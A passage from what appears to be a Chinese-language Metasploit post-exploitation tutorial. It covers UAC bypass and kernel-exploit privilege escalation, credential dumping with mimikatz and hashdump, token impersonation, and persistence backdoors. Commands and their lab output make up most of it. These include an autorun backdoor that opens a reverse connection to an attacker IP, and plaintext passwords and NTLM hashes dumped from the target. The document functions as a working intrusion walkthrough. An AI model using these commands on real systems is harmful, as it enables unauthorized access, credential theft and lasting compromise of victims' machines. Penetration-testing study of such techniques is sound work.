class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure><h3 id="4-6-获取凭证-2"><a href="#4-6-获取凭证-2" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>使用meterpreter的run hashdump命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-假冒令牌-2"><a href="#4-7-假冒令牌-2" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure><h3 id="4-8-植入后门-2"><a href="#4-8-植入后门-2" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul><li>REXENAME是拷贝到目标系统中的名字</li><li>EXEPATH是将要上传的后门在本地的位置</li><li>SESSION是选择运行此模块的会话</li><li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li></ul>尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span 